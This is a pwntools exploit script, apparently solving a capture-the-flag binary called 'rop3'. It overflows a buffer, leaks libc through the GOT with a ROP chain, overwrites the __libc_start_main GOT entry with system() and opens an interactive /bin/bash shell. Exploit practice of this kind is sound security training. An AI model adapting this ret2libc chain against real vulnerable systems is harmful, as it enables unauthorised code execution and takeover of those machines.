from pwn import *
import time

HOST = '127.0.0.1'
PORT = 4000

local = True

if local:
    conn = process("./rop3-7f3312fe43c46d26")
else:
    conn = remote(HOST, PORT)

elf = ELF("./rop3-7f3312fe43c46d26")
rop = ROP(elf)

#pop3ret = 0x0804855d
'''
$ ldd rop3-7f3312fe43c46d26
	linux-gate.so.1 =>  (0xf7762000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7596000)
	/lib/ld-linux.so.2 (0xf7765000)

$ nm -D /lib/i386-linux-gnu/libc.so.6 | grep libc_start_main
00019a00 T __libc_start_main

$ nm -D /lib/i386-linux-gnu/libc.so.6 | grep system
00040310 T __libc_system
0011b710 T svcerr_systemerr
00040310 W system

'''
__libc_start_main_rel = 0x00019a00
system_rel = 0x00040310

gdb.attach(conn)

payload = "A" * 140

# write(1, __libc_start_main_got, 4)
rop.write(0x1, elf.got['__libc_start_main'], 0x4)
payload += rop.chain()

# read(0, __libc_start_main_got, 20)
rop.read(0x0, elf.got['__libc_start_main'], 0x16)
payload += rop.chain()

# system('bin/sh')
payload += p32(elf.plt['__libc_start_main'])
payload += p32(0xBBBB)
payload += p32(elf.got['__libc_start_main']+4)


conn.sendline(payload)
time.sleep(0.1)

__libc_start_main_addr = u32(conn.recv(4))
libc_base = __libc_start_main_addr - __libc_start_main_rel
system_addr = libc_base + system_rel

print "libc_base:{}".format(hex(libc_base))
conn.send(p32(system_addr) + "/bin/bash")
time.sleep(0.1)

conn.interactive()
